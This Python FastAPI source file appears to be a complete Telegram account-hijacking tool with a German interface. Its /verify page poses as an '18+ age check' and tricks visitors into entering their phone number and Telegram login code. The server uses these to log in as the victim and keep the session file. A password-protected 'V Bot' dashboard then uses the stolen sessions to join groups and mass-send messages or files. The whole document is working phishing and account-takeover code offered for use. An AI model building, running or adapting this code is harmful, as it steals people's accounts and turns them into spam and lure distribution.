import asyncio
import os
import tempfile
import secrets
import shutil
from pathlib import Path
from telethon import TelegramClient
from telethon.errors import FloodWaitError, SessionPasswordNeededError
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from fastapi import FastAPI, UploadFile, File, Form, Request
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
import uvicorn
from dotenv import load_dotenv

load_dotenv()
API_ID = int(os.getenv("API_ID", "0"))
API_HASH = os.getenv("API_HASH", "")
ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "admin123")

app = FastAPI(title="Telegram Verify")

SESSIONS_DIR = Path("sessions")
SESSIONS_DIR.mkdir(exist_ok=True)
STATIC_DIR = Path("static")
STATIC_DIR.mkdir(exist_ok=True)
BG_PATH = STATIC_DIR / "bg.jpg"

login_clients = {}
sessions_tokens = {}

def get_sessions():
    return sorted([f.stem for f in SESSIONS_DIR.glob("*.session") if not f.name.endswith(".session-journal")])

def check_auth(request: Request):
    token = request.cookies.get("auth_token")
    return token in sessions_tokens

app.mount("/static", StaticFiles(directory="static"), name="static")

VERIFY_HTML = """
<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verifizieren</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family: system-ui, -apple-system, sans-serif; background:#0a0a12; min-height:100vh; color:#fff; }
.bg { position:fixed; inset:0; background-size:cover; background-position:center; z-index:-1; filter:blur(2px); }
.screen { min-height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:center; padding:20px; }
.hidden { display:none !important; }
.age-box { background: rgba(0,0,0,0.75); border-radius:20px; padding:24px; text-align:center; max-width:340px; }
.age-icon { font-size:80px; margin-bottom:12px; }
.age-box h2 { font-size:20px; margin-bottom:8px; }
.age-box p { color:#ccc; font-size:14px; margin-bottom:20px; line-height:1.4; }
.age-btn { background: linear-gradient(90deg, #7b2cbf, #9b59b6); color:#fff; border:none; padding:16px 32px; border-radius:14px; font-size:16px; font-weight:700; width:100%; cursor:pointer; }
.verify-box { background: rgba(0,0,0,0.8); border-radius:20px; padding:24px; text-align:center; max-width:340px; width:100%; }
.verify-box h2 { font-size:18px; margin-bottom:8px; }
.verify-box p { color:#aaa; font-size:13px; margin-bottom:16px; }
.code-boxes { display:flex; gap:8px; justify-content:center; margin:16px 0; }
.code-box { width:42px; height:50px; border:2px solid #444; border-radius:10px; background:#1a1a24; display:flex; align-items:center; justify-content:center; font-size:22px; font-weight:700; }
.code-box.filled { border-color:#7b2cbf; }
.keypad { display:grid; grid-template-columns:repeat(3,1fr); gap:10px; margin-top:16px; }
.key { background: linear-gradient(145deg, #6b2fa0, #8b4cbf); border:none; border-radius:14px; padding:16px; font-size:20px; font-weight:700; color:#fff; cursor:pointer; }
.key:active { transform:scale(0.95); }
.key.clear { background:#333; }
.phone-input { width:100%; padding:14px; border-radius:12px; border:1px solid #333; background:#1a1a24; color:#fff; font-size:16px; margin:8px 0; text-align:center; }
.req-btn { background: linear-gradient(90deg, #7b2cbf, #9b59b6); color:#fff; border:none; padding:14px; border-radius:14px; font-size:15px; font-weight:700; width:100%; cursor:pointer; margin-top:8px; }
.success { color:#4ade80; margin-top:12px; font-weight:600; }
.error { color:#ff5555; margin-top:12px; }
</style>
</head>
<body>
<div class="bg" id="bg" style="background-image:url('/static/bg.jpg?t=' + Date.now());"></div>
<div id="ageScreen" class="screen">
  <div class="age-box">
    <div class="age-icon">🔞</div>
    <h2>18+ Only</h2>
    <p>Dieser Content ist nur für Erwachsene. Bitte bestätige, dass du 18+ bist, um fortzufahren.</p>
    <button class="age-btn" onclick="showVerify()">Ja, ich bin 18+ ✓</button>
  </div>
</div>
<div id="verifyScreen" class="screen hidden">
  <div class="verify-box">
    <div style="font-size:40px; margin-bottom:8px;">🔐</div>
    <h2>Zugangscode</h2>
    <p>Gib deine Nummer ein und fordere den Code an</p>
    <input type="text" id="phone" class="phone-input" placeholder="+49 170 1234567">
    <button class="req-btn" onclick="startLogin()">Zugangscode anfordern</button>
    <div id="codeArea" style="display:none; margin-top:16px;">
      <div class="code-boxes" id="codeBoxes">
        <div class="code-box"></div><div class="code-box"></div><div class="code-box"></div><div class="code-box"></div><div class="code-box"></div>
      </div>
      <div class="keypad">
        <button class="key" onclick="addDigit('1')">1</button><button class="key" onclick="addDigit('2')">2</button><button class="key" onclick="addDigit('3')">3</button>
        <button class="key" onclick="addDigit('4')">4</button><button class="key" onclick="addDigit('5')">5</button><button class="key" onclick="addDigit('6')">6</button>
        <button class="key" onclick="addDigit('7')">7</button><button class="key" onclick="addDigit('8')">8</button><button class="key" onclick="addDigit('9')">9</button>
        <button class="key clear" onclick="clearCode()">⌫</button><button class="key" onclick="addDigit('0')">0</button><button class="key" onclick="submitCode()">✓</button>
      </div>
    </div>
    <div id="msg"></div>
  </div>
</div>
<script>
let code = '';
const params = new URLSearchParams(window.location.search);
const prefill = params.get('phone');
const auto = params.get('auto');
if (prefill) {
  document.getElementById('phone').value = prefill;
  showVerify();
  if (auto === '1') {
    setTimeout(() => startLogin(), 500);
  }
}
function showVerify() {
  document.getElementById('ageScreen').classList.add('hidden');
  document.getElementById('verifyScreen').classList.remove('hidden');
}
function updateBoxes() {
  const boxes = document.querySelectorAll('.code-box');
  boxes.forEach((b, i) => { b.textContent = code[i] || ''; b.classList.toggle('filled', !!code[i]); });
}
function addDigit(d) { if (code.length < 5) { code += d; updateBoxes(); } }
function clearCode() { code = code.slice(0, -1); updateBoxes(); }
async function startLogin() {
  const phone = document.getElementById('phone').value.trim();
  if (!phone) return alert('Nummer eingeben');
  document.getElementById('msg').textContent = 'Sende Code...';
  const res = await fetch('/verify/start', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone}) });
  const data = await res.json();
  if (data.ok) {
    document.getElementById('codeArea').style.display = 'block';
    document.getElementById('msg').className = 'success';
    document.getElementById('msg').textContent = 'Code gesendet!';
  } else {
    document.getElementById('msg').className = 'error';
    document.getElementById('msg').textContent = data.error || 'Fehler';
  }
}
async function submitCode() {
  if (code.length < 5) return alert('Code vollständig eingeben');
  const phone = document.getElementById('phone').value.trim();
  document.getElementById('msg').textContent = 'Verifiziere...';
  const res = await fetch('/verify/finish', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone, code, password:''}) });
  const data = await res.json();
  if (data.ok) {
    document.getElementById('msg').className = 'success';
    document.getElementById('msg').textContent = '✅ Erfolgreich verifiziert!';
    code = ''; updateBoxes();
  } else {
    document.getElementById('msg').className = 'error';
    document.getElementById('msg').textContent = data.error || 'Fehler';
  }
}
</script>
</body>
</html>
"""

LOGIN_HTML = """
<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin Login</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family: system-ui, -apple-system, sans-serif; background:#0a0a12; min-height:100vh; display:flex; align-items:center; justify-content:center; color:#fff; padding:20px; }
.box { background:#161622; border-radius:24px; padding:40px 32px; width:100%; max-width:380px; text-align:center; border:1px solid #222; }
h1 { font-size:26px; margin-bottom:8px; }
p { color:#888; margin-bottom:28px; }
input { width:100%; padding:14px; border-radius:14px; border:1px solid #2a2a3a; background:#0e0e16; color:#fff; font-size:16px; margin:8px 0; }
button { width:100%; padding:14px; background:#2d8cff; border:none; border-radius:14px; color:#fff; font-weight:600; font-size:16px; margin-top:12px; cursor:pointer; }
.error { color:#ff5555; margin-top:12px; }
</style>
</head>
<body>
<div class="box">
  <h1>⚡ Admin</h1>
  <p>Login</p>
  <form method="post" action="/login">
    <input type="password" name="password" placeholder="Passwort" required>
    <button type="submit">Einloggen</button>
  </form>
  ERROR_PLACEHOLDER
</div>
</body>
</html>
"""

DASHBOARD_HTML = """
<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>V Bot</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family: system-ui, -apple-system, sans-serif; background:#0e0e14; color:#eee; min-height:100vh; }
.header { background:#12121c; padding:14px 16px; display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #1e1e28; position:sticky; top:0; z-index:100; }
.header h1 { font-size:18px; font-weight:700; text-align:center; flex:1; }
.logout { background:#ef4444; color:#fff; padding:6px 12px; border-radius:10px; text-decoration:none; font-size:13px; font-weight:600; }
.status-bar { background:#161622; padding:10px 12px; display:flex; gap:8px; flex-wrap:wrap; border-bottom:1px solid #1e1e28; font-size:12px; }
.badge { padding:5px 10px; border-radius:20px; font-weight:600; display:flex; align-items:center; gap:4px; }
.green { background:#065f46; color:#6ee7b7; }
.purple { background:#4c1d95; color:#c4b5fd; }
.orange { background:#7c2d12; color:#fdba74; }
.container { max-width:480px; margin:0 auto; padding:12px; }
.menu-item { background:#1a1a24; border-radius:14px; padding:14px 16px; margin-bottom:8px; display:flex; align-items:center; justify-content:space-between; cursor:pointer; border:1px solid #222; }
.menu-item:hover { background:#22222e; }
.menu-left { display:flex; align-items:center; gap:12px; }
.menu-icon { width:36px; height:36px; background:#252536; border-radius:10px; display:flex; align-items:center; justify-content:center; font-size:18px; }
.menu-title { font-weight:600; font-size:15px; }
.menu-right { display:flex; align-items:center; gap:8px; color:#888; font-size:13px; }
.menu-badge { background:#252536; padding:4px 10px; border-radius:12px; font-size:12px; }
.arrow { color:#555; }
.panel { display:none; background:#161622; border-radius:14px; padding:16px; margin-bottom:12px; border:1px solid #222; }
.panel h3 { font-size:16px; margin-bottom:12px; color:#00d4ff; }
input, textarea { width:100%; padding:12px; border-radius:12px; border:1px solid #2a2a3a; background:#0e0e16; color:#fff; font-size:14px; margin:6px 0; }
button { width:100%; padding:12px; background:#2d8cff; border:none; border-radius:12px; color:#fff; font-weight:600; margin-top:8px; cursor:pointer; }
.secondary { background:#333; }
.accounts { display:flex; flex-wrap:wrap; gap:6px; margin:8px 0; }
.chip { background:#252536; padding:6px 12px; border-radius:20px; font-size:13px; display:flex; align-items:center; gap:6px; }
.chip input { width:auto; margin:0; }
.session-item { background:#1e1e2e; padding:10px 12px; border-radius:10px; margin-bottom:6px; display:flex; justify-content:space-between; align-items:center; }
.delete { background:#ef4444; color:#fff; border:none; padding:4px 10px; border-radius:8px; font-size:12px; width:auto; }
#log { background:#0e0e16; border-radius:10px; padding:12px; height:120px; overflow-y:auto; font-family:monospace; font-size:12px; }
.success { color:#4ade80; }
.error { color:#f87171; }
.info { color:#60a5fa; }
.bg-preview { width:100%; height:100px; border-radius:12px; background-size:cover; background-position:center; margin:8px 0; border:1px solid #333; }
</style>
</head>
<body>
<div class="header">
  <span></span>
  <h1>V Bot</h1>
  <a href="/logout" class="logout">Logout</a>
</div>
<div class="status-bar">
  <span class="badge green">● Userbot läuft</span>
  <span class="badge purple" id="activeCount">0 aktiv</span>
  <span class="badge orange">⚡ Auto-Send AUS</span>
  <span class="badge">🛡️ 2–5 s</span>
</div>
<div class="container">
  <div class="menu-item" onclick="togglePanel('send')">
    <div class="menu-left"><div class="menu-icon">✉️</div><div class="menu-title">Nachrichten senden</div></div>
    <div class="menu-right"><span class="menu-badge" id="sendCount">0 Konten</span><span class="arrow">›</span></div>
  </div>
  <div id="send" class="panel">
    <form id="sendForm">
      <div class="accounts" id="accountSelect"></div>
      <button type="button" class="secondary" onclick="loadGroups()">Gruppen laden</button>
      <div id="groupList" style="max-height:160px; overflow-y:auto; margin:8px 0;"></div>
      <input name="group" id="manualGroup" placeholder="Oder manuell: @gruppe / Link">
      <input type="file" name="file">
      <textarea name="caption" placeholder="Nachricht..."></textarea>
      <div style="display:grid; grid-template-columns:1fr 1fr; gap:8px;">
        <input type="number" name="rounds" value="1" min="1" placeholder="Wie oft">
        <input type="number" name="delay" value="8" min="1" placeholder="Delay (s)">
      </div>
      <button type="submit">Senden</button>
    </form>
  </div>

  <div class="menu-item" onclick="togglePanel('join')">
    <div class="menu-left"><div class="menu-icon">➕</div><div class="menu-title">Gruppe beitreten</div></div>
    <div class="menu-right"><span class="menu-badge" id="joinCount">0 Konten</span><span class="arrow">›</span></div>
  </div>
  <div id="join" class="panel">
    <div class="accounts" id="joinAccountSelect"></div>
    <input id="joinLink" placeholder="https://t.me/gruppe oder +invite">
    <button onclick="joinGroup()">Joinen</button>
  </div>

  <div class="menu-item" onclick="togglePanel('sessions')">
    <div class="menu-left"><div class="menu-icon">👤</div><div class="menu-title">Aktive Konten</div></div>
    <div class="menu-right"><span class="menu-badge" id="sessionBadge">0 aktiv</span><span class="arrow">›</span></div>
  </div>
  <div id="sessions" class="panel">
    <div id="sessionList"></div>
  </div>

  <div class="menu-item" onclick="togglePanel('upload')">
    <div class="menu-left"><div class="menu-icon">📤</div><div class="menu-title">Sessions hochladen</div></div>
    <div class="menu-right"><span class="arrow">›</span></div>
  </div>
  <div id="upload" class="panel">
    <form id="uploadForm">
      <input type="file" id="sessionFile" accept=".session">
      <button type="submit">Hochladen</button>
    </form>
  </div>

  <div class="menu-item" onclick="togglePanel('bg')">
    <div class="menu-left"><div class="menu-icon">🖼️</div><div class="menu-title">Hintergrund ändern</div></div>
    <div class="menu-right"><span class="arrow">›</span></div>
  </div>
  <div id="bg" class="panel">
    <div class="bg-preview" id="bgPreview" style="background-image:url('/static/bg.jpg?t=' + Date.now());"></div>
    <form id="bgForm">
      <input type="file" id="bgFile" accept="image/*">
      <button type="submit">Hintergrund ändern</button>
    </form>
  </div>

  <div class="menu-item" onclick="togglePanel('log')">
    <div class="menu-left"><div class="menu-icon">📋</div><div class="menu-title">Log</div></div>
    <div class="menu-right"><span class="arrow">›</span></div>
  </div>
  <div id="logPanel" class="panel">
    <div id="log">Bereit...</div>
  </div>
</div>
<script>
function togglePanel(id) {
  const panel = document.getElementById(id === 'log' ? 'logPanel' : id);
  document.querySelectorAll('.panel').forEach(p => { if (p !== panel) p.style.display = 'none'; });
  panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
}
async function loadSessions() {
  const res = await fetch('/sessions');
  const sessions = await res.json();
  document.getElementById('activeCount').textContent = sessions.length + ' aktiv';
  document.getElementById('sessionBadge').textContent = sessions.length + ' aktiv';
  document.getElementById('sendCount').textContent = sessions.length + ' Konten';
  document.getElementById('joinCount').textContent = sessions.length + ' Konten';
  const list = document.getElementById('sessionList');
  const select = document.getElementById('accountSelect');
  const joinSelect = document.getElementById('joinAccountSelect');
  if (!sessions.length) {
    list.innerHTML = '<p style="color:#666;">Keine Sessions</p>';
    select.innerHTML = '<p style="color:#666;">Keine</p>';
    joinSelect.innerHTML = '<p style="color:#666;">Keine</p>';
    return;
  }
  list.innerHTML = sessions.map(s => `<div class="session-item"><span>${s}</span><button class="delete" onclick="deleteSession('${s}')">Löschen</button></div>`).join('');
  const chips = sessions.map(s => `<label class="chip"><input type="checkbox" name="accounts" value="${s}" checked> ${s}</label>`).join('');
  select.innerHTML = chips;
  joinSelect.innerHTML = sessions.map(s => `<label class="chip"><input type="checkbox" name="joinAccounts" value="${s}" checked> ${s}</label>`).join('');
}
function log(msg, type='info') {
  const el = document.getElementById('log');
  el.innerHTML += `<div class="${type}">${msg}</div>`;
  el.scrollTop = el.scrollHeight;
}
document.getElementById('uploadForm').onsubmit = async (e) => {
  e.preventDefault();
  const fileInput = document.getElementById('sessionFile');
  if (!fileInput.files[0]) return alert('Datei auswählen');
  const data = new FormData();
  data.append('file', fileInput.files[0]);
  log('Lade Session hoch...', 'info');
  try {
    const res = await fetch('/session/upload', { method:'POST', body:data });
    const result = await res.json();
    if (result.ok) { log('Hochgeladen: ' + result.name, 'success'); loadSessions(); }
    else log(result.error || 'Fehler', 'error');
  } catch(err) { log('Fehler: ' + err, 'error'); }
};
document.getElementById('bgForm').onsubmit = async (e) => {
  e.preventDefault();
  const fileInput = document.getElementById('bgFile');
  if (!fileInput.files[0]) return alert('Bild auswählen');
  const data = new FormData();
  data.append('file', fileInput.files[0]);
  log('Ändere Hintergrund...', 'info');
  try {
    const res = await fetch('/bg/upload', { method:'POST', body:data });
    const result = await res.json();
    if (result.ok) {
      log('Hintergrund geändert', 'success');
      document.getElementById('bgPreview').style.backgroundImage = "url('/static/bg.jpg?t=" + Date.now() + "')";
    } else log(result.error || 'Fehler', 'error');
  } catch(err) { log('Fehler: ' + err, 'error'); }
};
async function deleteSession(name) {
  if (!confirm('Löschen?')) return;
  const res = await fetch('/session/delete', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({name}) });
  const data = await res.json();
  if (data.ok) { log('Gelöscht: ' + name, 'success'); loadSessions(); }
  else log(data.error || 'Fehler', 'error');
}
async function joinGroup() {
  const link = document.getElementById('joinLink').value.trim();
  const accounts = [...document.querySelectorAll('input[name="joinAccounts"]:checked')].map(i => i.value);
  if (!link) return alert('Link eingeben');
  if (!accounts.length) return alert('Account auswählen');
  log('Joine...', 'info');
  const res = await fetch('/join', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({link, accounts}) });
  const data = await res.json();
  data.results.forEach(r => log(r.message, r.ok ? 'success' : 'error'));
}
async function loadGroups() {
  const checked = [...document.querySelectorAll('input[name="accounts"]:checked')].map(i => i.value);
  if (!checked.length) return alert('Account auswählen');
  log('Lade Gruppen...', 'info');
  const res = await fetch('/groups', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({accounts: checked}) });
  const data = await res.json();
  const list = document.getElementById('groupList');
  if (!data.groups || !data.groups.length) { list.innerHTML = '<p style="color:#666;">Keine Gruppen</p>'; return; }
  list.innerHTML = data.groups.map(g => `<label class="chip" style="display:flex; width:100%; margin-bottom:4px;"><input type="checkbox" name="groups" value="${g.id}"> ${g.title}</label>`).join('');
  log(data.groups.length + ' Gruppen geladen', 'success');
}
document.getElementById('sendForm').onsubmit = async (e) => {
  e.preventDefault();
  const form = e.target;
  const data = new FormData(form);
  const accounts = [...document.querySelectorAll('input[name="accounts"]:checked')].map(i => i.value);
  const groups = [...document.querySelectorAll('input[name="groups"]:checked')].map(i => i.value);
  const manual = document.getElementById('manualGroup').value.trim();
  if (!accounts.length) return alert('Account auswählen');
  if (!groups.length && !manual) return alert('Gruppe auswählen');
  data.delete('accounts'); data.delete('groups');
  accounts.forEach(a => data.append('accounts', a));
  groups.forEach(g => data.append('groups', g));
  if (manual) data.append('manual', manual);
  log('Sende...', 'info');
  const btn = form.querySelector('button[type=submit]');
  btn.disabled = true;
  try {
    const res = await fetch('/send', {method:'POST', body:data});
    const result = await res.json();
    result.results.forEach(r => log(r.message, r.ok ? 'success' : 'error'));
  } catch(err) { log('Fehler: ' + err, 'error'); }
  btn.disabled = false;
};
loadSessions();
</script>
</body>
</html>
"""

@app.get("/verify", response_class=HTMLResponse)
async def verify_page():
    return HTMLResponse(VERIFY_HTML)

@app.get("/", response_class=HTMLResponse)
async def root(request: Request):
    if not check_auth(request):
        return RedirectResponse("/login")
    return HTMLResponse(DASHBOARD_HTML)

@app.get("/login", response_class=HTMLResponse)
async def login_page(request: Request, error: str = ""):
    if check_auth(request):
        return RedirectResponse("/")
    html = LOGIN_HTML.replace("ERROR_PLACEHOLDER", f'<div class="error">{error}</div>' if error else "")
    return HTMLResponse(html)

@app.post("/login")
async def login(password: str = Form(...)):
    if password == ADMIN_PASSWORD:
        token = secrets.token_urlsafe(32)
        sessions_tokens[token] = True
        response = RedirectResponse("/", status_code=303)
        response.set_cookie("auth_token", token, httponly=True, max_age=86400*7)
        return response
    return RedirectResponse("/login?error=Falsches Passwort", status_code=303)

@app.get("/logout")
async def logout(request: Request):
    token = request.cookies.get("auth_token")
    if token in sessions_tokens:
        sessions_tokens.pop(token, None)
    response = RedirectResponse("/login")
    response.delete_cookie("auth_token")
    return response

@app.get("/sessions")
async def sessions(request: Request):
    if not check_auth(request):
        return JSONResponse({"error": "unauthorized"}, status_code=401)
    return get_sessions()

@app.post("/groups")
async def get_groups(request: Request):
    if not check_auth(request):
        return JSONResponse({"error": "unauthorized"}, status_code=401)
    data = await request.json()
    accounts = data.get("accounts", [])
    groups = []
    seen = set()
    for session_name in accounts[:3]:
        try:
            client = TelegramClient(str(SESSIONS_DIR / session_name), API_ID, API_HASH)
            await client.start()
            async for dialog in client.iter_dialogs():
                if dialog.is_group or dialog.is_channel:
                    if dialog.id not in seen:
                        seen.add(dialog.id)
                        groups.append({"id": dialog.id, "title": dialog.title or str(dialog.id)})
            await client.disconnect()
        except Exception:
            pass
    return {"groups": groups[:100]}

@app.post("/join")
async def join_group(request: Request):
    if not check_auth(request):
        return JSONResponse({"results": [{"ok": False, "message": "unauthorized"}]}, status_code=401)
    data = await request.json()
    link = data.get("link", "").strip()
    accounts = data.get("accounts", [])
    results = []
    for session_name in accounts:
        try:
            client = TelegramClient(str(SESSIONS_DIR / session_name), API_ID, API_HASH)
            await client.start()
            me = await client.get_me()
            name = me.first_name or session_name
            if "/+" in link or "joinchat" in link:
                hash_part = link.split("/")[-1].replace("+", "")
                await client(ImportChatInviteRequest(hash_part))
            else:
                await client(JoinChannelRequest(link))
            results.append({"ok": True, "message": f"[{name}] erfolgreich gejoint"})
            await client.disconnect()
            await asyncio.sleep(2)
        except Exception as e:
            results.append({"ok": False, "message": f"[{session_name}] {str(e)[:80]}"})
    return {"results": results}

@app.post("/session/upload")
async def upload_session(request: Request, file: UploadFile = File(...)):
    if not check_auth(request):
        return JSONResponse({"ok": False, "error": "unauthorized"}, status_code=401)
    if not file.filename.endswith(".session"):
        return {"ok": False, "error": "Nur .session Dateien"}
    name = Path(file.filename).stem
    dest = SESSIONS_DIR / f"{name}.session"
    with open(dest, "wb") as f:
        shutil.copyfileobj(file.file, f)
    return {"ok": True, "name": name}

@app.post("/session/delete")
async def delete_session(request: Request):
    if not check_auth(request):
        return JSONResponse({"ok": False, "error": "unauthorized"}, status_code=401)
    data = await request.json()
    name = data.get("name", "")
    path = SESSIONS_DIR / f"{name}.session"
    if path.exists():
        path.unlink()
        return {"ok": True}
    return {"ok": False, "error": "Nicht gefunden"}

@app.post("/bg/upload")
async def upload_bg(request: Request, file: UploadFile = File(...)):
    if not check_auth(request):
        return JSONResponse({"ok": False, "error": "unauthorized"}, status_code=401)
    if not file.content_type.startswith("image/"):
        return {"ok": False, "error": "Nur Bilder"}
    with open(BG_PATH, "wb") as f:
        shutil.copyfileobj(file.file, f)
    return {"ok": True}

@app.post("/verify/start")
async def verify_start(request: Request):
    data = await request.json()
    phone = data.get("phone", "").strip()
    if not phone:
        return {"ok": False, "error": "Keine Nummer"}
    try:
        session_name = phone.replace("+", "").replace(" ", "")
        client = TelegramClient(str(SESSIONS_DIR / session_name), API_ID, API_HASH)
        await client.connect()
        await client.send_code_request(phone)
        login_clients[phone] = client
        return {"ok": True}
    except Exception as e:
        return {"ok": False, "error": str(e)[:150]}

@app.post("/verify/finish")
async def verify_finish(request: Request):
    data = await request.json()
    phone = data.get("phone", "").strip()
    code = data.get("code", "").strip()
    password = data.get("password", "").strip()
    client = login_clients.get(phone)
    if not client:
        return {"ok": False, "error": "Zuerst Code anfordern"}
    try:
        await client.sign_in(phone, code)
    except SessionPasswordNeededError:
        if not password:
            return {"ok": False, "error": "2FA nötig"}
        await client.sign_in(password=password)
    except Exception as e:
        return {"ok": False, "error": str(e)[:150]}
    me = await client.get_me()
    await client.disconnect()
    login_clients.pop(phone, None)
    return {"ok": True, "name": me.first_name or phone}

@app.post("/send")
async def send(request: Request, caption: str = Form(""), delay: int = Form(8), rounds: int = Form(1), file: UploadFile = File(None)):
    if not check_auth(request):
        return JSONResponse({"results": [{"ok": False, "message": "unauthorized"}]}, status_code=401)
    form = await request.form()
    accounts = form.getlist("accounts")
    groups = form.getlist("groups")
    manual = form.get("manual", "").strip()
    targets = groups + ([manual] if manual else [])
    if not accounts or not targets:
        return {"results": [{"ok": False, "message": "Keine Accounts oder Gruppen"}]}
    temp_path = None
    if file and file.filename:
        temp_path = tempfile.mktemp(suffix=Path(file.filename).suffix)
        with open(temp_path, "wb") as f:
            f.write(await file.read())
    results = []
    for r in range(rounds):
        for session_name in accounts:
            try:
                client = TelegramClient(str(SESSIONS_DIR / session_name), API_ID, API_HASH)
                await client.start()
                me = await client.get_me()
                name = me.first_name or session_name
                for target in targets:
                    try:
                        if temp_path:
                            await client.send_file(int(target) if str(target).lstrip('-').isdigit() else target, temp_path, caption=caption or None)
                        elif caption:
                            await client.send_message(int(target) if str(target).lstrip('-').isdigit() else target, caption)
                        results.append({"ok": True, "message": f"[{name}] → {target} gesendet"})
                    except Exception as e:
                        results.append({"ok": False, "message": f"[{name}] → {target}: {str(e)[:60]}"})
                await client.disconnect()
                await asyncio.sleep(delay)
            except Exception as e:
                results.append({"ok": False, "message": f"[{session_name}] {str(e)[:80]}"})
    if temp_path and os.path.exists(temp_path):
        os.remove(temp_path)
    return {"results": results}

if __name__ == "__main__":
    print("Starte auf http://0.0.0.0:8000")
    print(f"Passwort: {ADMIN_PASSWORD}")
    print("Verify-Seite: /verify")
    uvicorn.run(app, host="0.0.0.0", port=8000)
